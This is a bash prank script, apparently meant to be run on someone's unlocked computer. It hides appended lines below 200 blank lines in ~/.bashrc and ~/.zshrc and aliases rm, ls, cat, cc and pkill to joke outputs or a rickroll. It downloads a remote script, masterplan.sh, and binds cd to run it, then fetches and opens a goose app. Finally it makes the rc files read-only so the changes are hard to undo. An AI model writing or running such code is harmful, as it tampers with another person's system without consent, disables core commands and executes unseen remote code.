#!/bin/bash

add_alias() {
    local alias_command="$1"
    local alias_file="$2"
    if ! grep -q "$alias_command" "$alias_file"; then
        echo "$alias_command" >> "$alias_file"
    fi
}

for i in {1..200}; do
    echo "" >> ~/.bashrc
done

for i in {1..200}; do
    echo "" >> ~/.zshrc
done

add_alias "alias cat='printf \"meow\n\"'" ~/.bashrc
add_alias "alias cat='printf \"meow\n\"'" ~/.zshrc

add_alias "alias rm='open ~/goose/goose.app'" ~/.bashrc
add_alias "alias rm='open ~/goose/goose.app'" ~/.zshrc

add_alias "alias ls='echo \"Segmentation fault\"'" ~/.bashrc
add_alias "alias ls='echo \"Segmentation fault\"'" ~/.zshrc

add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.bashrc
add_alias "alias cc='telnet towel.blinkenlights.nl'" ~/.zshrc

add_alias "echo \"Did you lock your screen?\"" ~/.bashrc
add_alias "echo \"Did you lock your screen?\"" ~/.zshrc

add_alias "alias pkill='open \"https://shattereddisk.github.io/rickroll/rickroll.mp4\"'" ~/.bashrc
add_alias "alias pkill='open \"https://shattereddisk.github.io/rickroll/rickroll.mp4\"'" ~/.zshrc

curl https://raw.githubusercontent.com/JonasGoetz01/sui/main/masterplan.sh > ~/masterplan.sh
chmod +x ~/masterplan.sh
echo "alias cd='bash ~/masterplan.sh'" >> ~/.zshrc
echo "alias cd='bash ~/masterplan.sh'" >> ~/.bashrc

chmod -w ~/.zshrc
chmod -w ~/.bashrc

curl -L -o ~/goose.zip 'https://raw.githubusercontent.com/PaulicStudios/goose/refs/heads/main/goose.zip'
unzip -o ~/goose.zip -d ~/goose
open ~/goose/goose.app

source ~/.bashrc
source ~/.zshrc
